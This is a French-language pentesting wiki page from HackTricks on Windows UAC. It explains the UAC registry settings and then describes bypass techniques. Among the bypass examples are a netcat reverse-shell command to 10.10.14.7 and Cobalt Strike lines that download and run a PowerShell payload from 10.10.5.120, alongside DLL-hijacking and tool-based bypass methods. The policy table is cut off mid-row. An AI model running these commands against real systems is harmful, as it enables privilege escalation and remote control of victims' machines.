# UAC - Contrôle de compte d'utilisateur

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

![](<../../.gitbook/assets/image (9) (1) (2).png>)

Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour créer et **automatiser facilement des workflows** alimentés par les outils communautaires les plus avancés au monde.\
Obtenez l'accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

Le **Contrôle de compte d'utilisateur (UAC)** est une fonctionnalité qui permet une **demande de consentement pour les activités élevées**. Les applications ont différents niveaux d'`intégrité`, et un programme avec un **niveau élevé** peut effectuer des tâches qui **pourraient potentiellement compromettre le système**. Lorsque l'UAC est activé, les applications et les tâches s'exécutent toujours sous le contexte de sécurité d'un compte non administrateur, sauf si un administrateur autorise explicitement ces applications/tâches à avoir un accès de niveau administrateur au système pour s'exécuter. Il s'agit d'une fonctionnalité de commodité qui protège les administrateurs contre les modifications non intentionnelles, mais qui n'est pas considérée comme une limite de sécurité.

Pour plus d'informations sur les niveaux d'intégrité :

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

Lorsque l'UAC est en place, un utilisateur administrateur reçoit 2 jetons : une clé d'utilisateur standard, pour effectuer des actions régulières en tant que niveau régulier, et une avec les privilèges d'administrateur.

Cette [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) explique en détail le fonctionnement de l'UAC et inclut le processus de connexion, l'expérience utilisateur et l'architecture de l'UAC. Les administrateurs peuvent utiliser des stratégies de sécurité pour configurer le fonctionnement de l'UAC spécifique à leur organisation au niveau local (en utilisant secpol.msc), ou configuré et déployé via des objets de stratégie de groupe (GPO) dans un environnement de domaine Active Directory. Les différents paramètres sont discutés en détail [ici](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Il existe 10 paramètres de stratégie de groupe qui peuvent être définis pour l'UAC. Le tableau suivant fournit des détails supplémentaires :

| Paramètre de stratégie de groupe                                                                                                                                                                                                                                                                                                                                                           | Clé de registre                | Paramètre par défaut                                              |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------- | ------------------------------------------------------------ |
| [Mode d'approbation de l'administrateur du compte intégré Administrateur](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Désactivé                                                     |
| [Autoriser les applications UIAccess à demander une élévation sans utiliser le bureau sécurisé](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Désactivé                                                     |
| [Comportement de la boîte de dialogue d'élévation pour les administrateurs en mode d'approbation de l'administrateur](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Demander un consentement pour les binaires non Windows                  |
| [Comportement de la boîte de dialogue d'élévation pour les utilisateurs standard](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Demander des informations d'identification sur le bureau sécurisé                 |
| [Détecter les installations d'applications et demander une élévation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Activé (par défaut pour les particuliers) Désactivé (par défaut pour les entreprises) |
| [Élever uniquement les exécutables signés et validés](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Désactivé                                                     |
| [Élever uniquement les applications UIAccess installées dans des emplacements sécurisés](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Activé                                                      |
| [Exécuter tous les administrateurs en mode d'approbation de l'administrateur](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Activé                                                      |
| [Basculer sur le bureau sécurisé lors de la demande d'élévation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
```
Si la valeur est **`1`**, alors UAC est **activé**. Si elle est **`0`** ou qu'elle **n'existe pas**, alors UAC est **inactif**.

Ensuite, vérifiez **quel niveau** est configuré :
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* Si la valeur est **`0`**, alors UAC ne demandera rien (comme **désactivé**)
* Si la valeur est **`1`**, l'administrateur est **invité à entrer son nom d'utilisateur et son mot de passe** pour exécuter le binaire avec des droits élevés (sur le bureau sécurisé)
* Si la valeur est **`2`** (**Toujours m'avertir**), UAC demandera toujours une confirmation à l'administrateur lorsqu'il essaie d'exécuter quelque chose avec des privilèges élevés (sur le bureau sécurisé)
* Si la valeur est **`3`**, c'est comme `1` mais pas nécessaire sur le bureau sécurisé
* Si la valeur est **`4`**, c'est comme `2` mais pas nécessaire sur le bureau sécurisé
* Si la valeur est **`5`** (**par défaut**), l'administrateur devra confirmer pour exécuter des binaires non Windows avec des privilèges élevés

Ensuite, vous devez vérifier la valeur de **`LocalAccountTokenFilterPolicy`**\
Si la valeur est **`0`**, alors seul l'utilisateur RID 500 (**Administrateur intégré**) peut effectuer des tâches d'administration **sans UAC**, et si elle est `1`, **tous les comptes dans le groupe "Administrateurs"** peuvent le faire.

Enfin, vérifiez la valeur de la clé **`FilterAdministratorToken`**\
Si elle est **`0`** (par défaut), le compte **Administrateur intégré peut** effectuer des tâches d'administration à distance et si elle est **`1`**, le compte intégré Administrateur **ne peut pas** effectuer de tâches d'administration à distance, sauf si `LocalAccountTokenFilterPolicy` est défini sur `1`.

#### Résumé

* Si `EnableLUA=0` ou **n'existe pas**, **aucun UAC pour personne**
* Si `EnableLua=1` et **`LocalAccountTokenFilterPolicy=1` , aucun UAC pour personne**
* Si `EnableLua=1` et **`LocalAccountTokenFilterPolicy=0` et `FilterAdministratorToken=0`, aucun UAC pour RID 500 (Administrateur intégré)**
* Si `EnableLua=1` et **`LocalAccountTokenFilterPolicy=0` et `FilterAdministratorToken=1`, UAC pour tout le monde**

Toutes ces informations peuvent être obtenues à l'aide du module **metasploit** : `post/windows/gather/win_privs`

Vous pouvez également vérifier les groupes de votre utilisateur et obtenir le niveau d'intégrité :
```
net user %username%
whoami /groups | findstr Level
```
## Contournement de l'UAC

{% hint style="info" %}
Notez que si vous avez un accès graphique à la victime, le contournement de l'UAC est simple car vous pouvez simplement cliquer sur "Oui" lorsque la fenêtre de l'UAC apparaît.
{% endhint %}

Le contournement de l'UAC est nécessaire dans la situation suivante: **l'UAC est activé, votre processus s'exécute dans un contexte d'intégrité moyenne et votre utilisateur appartient au groupe des administrateurs**.

Il est important de mentionner qu'il est **beaucoup plus difficile de contourner l'UAC s'il est au niveau de sécurité le plus élevé (Toujours) que s'il est à l'un des autres niveaux (Par défaut).**

### UAC désactivé

Si l'UAC est déjà désactivé (`ConsentPromptBehaviorAdmin` est **`0`**), vous pouvez **exécuter un shell inversé avec des privilèges d'administrateur** (niveau d'intégrité élevé) en utilisant quelque chose comme:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### Contournement de l'UAC avec la duplication de jeton

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Contournement "très" basique de l'UAC (accès complet au système de fichiers)

Si vous avez un shell avec un utilisateur faisant partie du groupe Administrateurs, vous pouvez **monter le partage C$** via SMB (système de fichiers) localement sur un nouveau disque et vous aurez **accès à tout le système de fichiers** (même le dossier personnel de l'administrateur).

{% hint style="warning" %}
**Il semble que cette astuce ne fonctionne plus**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Contournement de l'UAC avec Cobalt Strike

Les techniques de Cobalt Strike ne fonctionneront que si l'UAC n'est pas réglé sur son niveau de sécurité maximal.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** et **Metasploit** ont également plusieurs modules pour **contourner** le **UAC**.

### Exploits de contournement de UAC

[**UACME**](https://github.com/hfiref0x/UACME) qui est une **compilation** de plusieurs exploits de contournement de UAC. Notez que vous devrez **compiler UACME en utilisant Visual Studio ou MSBuild**. La compilation créera plusieurs exécutables (comme `Source\Akagi\outout\x64\Debug\Akagi.exe`), vous devrez savoir **lequel vous avez besoin**.\
Vous devriez **être prudent** car certains contournements **peuvent déclencher d'autres programmes** qui **alerteront** l'**utilisateur** qu'il se passe quelque chose.

UACME a la **version de construction à partir de laquelle chaque technique a commencé à fonctionner**. Vous pouvez rechercher une technique affectant vos versions :
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
De plus, en utilisant [cette page](https://en.wikipedia.org/wiki/Windows_10_version_history), vous obtenez la version Windows `1607` à partir des versions de build.

#### Plus de contournements UAC

**Toutes** les techniques utilisées ici pour contourner l'UAC **nécessitent** un **shell interactif complet** avec la victime (un shell nc.exe commun n'est pas suffisant).

Vous pouvez utiliser une session **meterpreter**. Migrez vers un **processus** dont la valeur de **Session** est égale à **1** :

![](<../../.gitbook/assets/image (96).png>)

(_explorer.exe_ devrait fonctionner)

### Contournement UAC avec GUI

Si vous avez accès à une **GUI, vous pouvez simplement accepter la demande UAC** lorsque vous la recevez, vous n'avez pas vraiment besoin de la contourner. Ainsi, l'accès à une GUI vous permettra de contourner l'UAC.

De plus, si vous obtenez une session GUI qu'une personne utilisait (potentiellement via RDP), il y a **des outils qui seront exécutés en tant qu'administrateur** à partir desquels vous pourriez **exécuter** une **cmd** par exemple **en tant qu'administrateur** directement sans être à nouveau invité par l'UAC comme [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Cela pourrait être un peu plus **furtif**.

### Contournement UAC bruyant par force brute

Si vous ne vous souciez pas d'être bruyant, vous pouvez toujours **exécuter quelque chose comme** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) qui **demande l'élévation des permissions jusqu'à ce que l'utilisateur l'accepte**.

### Votre propre contournement - Méthodologie de base de contournement UAC

Si vous jetez un coup d'œil à **UACME**, vous remarquerez que **la plupart des contournements UAC exploitent une vulnérabilité de détournement de Dll** (principalement en écrivant la dll malveillante sur _C:\Windows\System32_). [Lisez ceci pour apprendre comment trouver une vulnérabilité de détournement de Dll](../windows-local-privilege-escalation/dll-hijacking.md).

1. Trouvez un binaire qui **s'autoélève** (vérifiez que lorsqu'il est exécuté, il s'exécute avec un niveau d'intégrité élevé).
2. Avec procmon, trouvez les événements "**NAME NOT FOUND**" qui peuvent être vulnérables au **détournement de DLL**.
3. Vous devrez probablement **écrire** la DLL à l'intérieur de certains **chemins protégés** (comme C:\Windows\System32) où vous n'avez pas les autorisations d'écriture. Vous pouvez contourner cela en utilisant :
   1. **wusa.exe** : Windows 7,8 et 8.1. Il permet d'extraire le contenu d'un fichier CAB à l'intérieur de chemins protégés (parce que cet outil est exécuté à partir d'un niveau d'intégrité élevé).
   2. **IFileOperation** : Windows 10.
4. Préparez un **script** pour copier votre DLL à l'intérieur du chemin protégé et exécuter le binaire vulnérable et autoélevé.

### Une autre technique de contournement UAC

Consiste à surveiller si un binaire **autoélevé** essaie de **lire** dans le **registre** le **nom/chemin** d'un **binaire** ou d'une **commande** à **exécuter** (ceci est plus intéressant si le binaire recherche cette information à l'intérieur de **HKCU**).

![](<../../.gitbook/assets/image (9) (1) (2).png>)

Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics\&utm_medium=banner\&utm_source=hacktricks) pour créer et **automatiser des workflows** alimentés par les outils communautaires les plus avancés au monde.\
Obtenez l'accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs.
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
